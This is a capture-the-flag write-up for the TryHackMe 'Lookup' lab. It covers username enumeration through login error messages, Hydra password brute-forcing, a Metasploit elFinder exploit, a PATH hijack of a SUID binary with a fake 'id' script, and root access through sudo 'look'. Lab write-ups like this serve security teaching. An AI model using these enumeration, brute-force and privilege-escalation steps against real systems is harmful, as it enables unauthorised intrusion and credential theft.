---
title: Lookup Writeup
---
[Lookup Room](https://tryhackme.com/room/lookup)
# Set up
Add the target to `/etc/hosts`.
```bash
sudo vim /etc/hosts
```
![[Pasted image 20260526215848.png]]
# Enumeration
## Service Enumeration
the first thing I always do is run `nmap` against the target.
```bash
mongkol@mongkol:~$ sudo nmap -sS -sV 10.48.177.118
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-05-26 21:57 +07
Nmap scan report for lookup.thm (10.48.177.118)
Host is up (0.085s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.70 seconds
```
We have 2 services serving on the target. Let's visit the web service first.
![[Pasted image 20260526220256.png]]
We are greeted with a login page. Put that aside, I already ran `directory brute force` and `subdomain brute force` but nothing hits.

Let's try logging in as `admin:admin` or any other default credentials.
![[Pasted image 20260526220500.png]]
Interesting invalid message when trying to log in as `admin:admin`. How about other username?
![[Pasted image 20260526220608.png]]
Good message, We can see if the user is a valid user or not via these invalid messages. I tried `tester:tester` meaning the user `tester` doesn't exists and user `admin` exists. So, let's build a python script that enumerates for existing users.
```python
import requests

# Define the target URL
url = "http://lookup.thm/login.php"

# Define the file path containing usernames
file_path = "/usr/share/wordlists/seclists/Usernames/Names/names.txt"

# Read the file and process each line
try:
    with open(file_path, "r") as file:
        for line in file:
            username = line.strip()
            if not username:
                continue  # Skip empty lines
            
            # Prepare the POST data
            data = {
                "username": username,
                "password": "password"  # Fixed password for testing
            }

            # Send the POST request
            response = requests.post(url, data=data)
            
            # Check the response content
            if "Wrong password" in response.text:
                print(f"Username found: {username}")
            elif "wrong username" in response.text:
                continue  # Silent continuation for wrong usernames
except FileNotFoundError:
    print(f"Error: The file {file_path} does not exist.")
except requests.RequestException as e:
    print(f"Error: An HTTP request error occurred: {e}")
```

Result:
```bash
python3 username.py
Username found: admin
Username found: jose
```

## Password Brute Force
let's brute force jose's password with `hydra`:
```bash
hydra -l "jose" -P /usr/share/wordlists/rockyou.txt lookup.thm http-post-form "/login:username=^USER^&password=^PASS^:Wrong password. Please try again."
```
result:
```bash
[80][http-post-form] host: lookup.thm   login: jose   password: [redacted]
```

Let's login with `jose:password123`:
![[Pasted image 20260526221359.png]]

We got redirected to a subdomain, but resulted in `Server Not Found`, let's add the host to `/etc/hosts` first.
![[Pasted image 20260526221507.png]]

we landed to the page with something called `elFinder` as the service and a bunch of files:
![[Pasted image 20260526221635.png]]

Checking the files, give us nothing but blobs so let's check the service version:
![[Pasted image 20260526221736.png]]
## Vulnerability Exploitation
`elFinder 2.1.47`. Let's search to see if there is any vulnerability exists for this specific version:
![[Pasted image 20260526221828.png]]
![[Pasted image 20260526222113.png]]

Good finding, let's check in `msfconsole`:
```bash
sudo msfconsole
msf>search elfinder
```
![[Pasted image 20260526222018.png]]
let's use `#4` since it is the specific exploit for `elFinder 2.1.47`:
![[Pasted image 20260526222146.png]]

Set the listening host to our machine:
![[Pasted image 20260526222230.png]]

Set the target (rhosts) to `files.lookup.thm`:
![[Pasted image 20260526222303.png]]

Exploit:
![[Pasted image 20260526222404.png]]
## OS Enumeration
We got in, let's spawn a shell:
![[Pasted image 20260526222504.png]]

We got a `www-data` user's shell. let's get a proper shell with python since `python3` exists:
![[Pasted image 20260526222603.png]]

script:
```python
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
result:
![[Pasted image 20260526222706.png]]

Move back to the `home` directory and we get to see the existing users:
![[Pasted image 20260526222813.png]]

Let's check `think`'s folder to see if anything's available for us:
![[Pasted image 20260526222852.png]]

Since only the `root` and the owner of the file (`think`) can read the user flag (`user.txt`), let's find out how we can escalate to act as `think` or read the file from our current user. First, let's find out what binary has `SUID` set.

**NOTE:** `SUID` - Set-User ID, a type of special permission that allows any user to run the binary as the owner of the binary.

Script:
```bash
find / -type f -perm 4000 -ls 2>/dev/null
```
![[Pasted image 20260526223602.png]]
`usr/sbin/pwm` that is a suspicious binary. Let's strings it out and get a help of analysis from gemini:
```bash
strings /usr/sbin/pwm
```
```bash
www-data@ip-10-48-177-118:/home/think$ strings /usr/sbin/pwm
strings /usr/sbin/pwm
/lib64/ld-linux-x86-64.so.2
libc.so.6
fopen
perror
puts
__stack_chk_fail
putchar
popen
fgetc
__isoc99_fscanf
fclose
pclose
__cxa_finalize
__libc_start_main
snprintf
GLIBC_2.4
GLIBC_2.7
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u+UH
[]A\A]A^A_
[!] Running 'id' command to extract the username and user ID (UID)
[-] Error executing id command
...
```
Gemini's response:
![[Pasted image 20260526223914.png]]

So, it reads the CURRENT user's `.passwords` file by running the command `id` to get the running user's. can we hijack its path? let's check the `$PATH` and writable directories; specifically `/tmp` directory:
```bash
echo $PATH
```
![[Pasted image 20260526224128.png]]

```bash
find / -type d -writable 2>/dev/null | grep /tmp
```
![[Pasted image 20260526224243.png]]
We can write to the `/tmp` folder, that's nice.

Here's what we gonna do. First, we will add the `/tmp` to the `$PATH` then we will write an evil `id` binary to trick the OS to execute the `id` in the `/tmp` folder rather than the legit `id` command.

In that evil `id` binary, we will trick `/usr/sbin/pwm` to think that we are the user `think`, then spits out what's in the `think`'s `.passwords` as we see above.

Let's add the `/tmp` directory to `$PATH`:
```bash
export PATH=/tmp:$PATH
```
![[Pasted image 20260526224743.png]]

Create the `id` in the `/tmp` folder with below content:
```
echo -e '#!/bin/bash\necho "uid=33(think) gid=33(think) groups=33(think)"' > /tmp/id

chmod 777 /tmp/id
```

let's run the binary as usual:
```bash
www-data@ip-10-48-177-118:/home/think$ pwm
```

Result:
![[Pasted image 20260526225444.png]]

Save those password a file then brute force the user `think`'s `ssh` password:
```bash
hydra -l "think" -P think_passwords.txt ssh://10.48.177.118
```
Result:
```bash
[22][ssh] host: 10.49.128.65   login: think   password: [redacted]
```

Let's `ssh` as `think`:
![[Pasted image 20260526225901.png]]

From there we get the user's flag `user.txt`:
![[Pasted image 20260526230024.png]]

Let see what `sudo` commands can this user run:
![[Pasted image 20260526230122.png]]

Let's take a look what is the `look` command with [GTFOBins](https://gtfobins.org/gtfobins/look/).
![[Pasted image 20260526230401.png]]

Run it and we get the root flag.
![[Pasted image 20260526230239.png]]
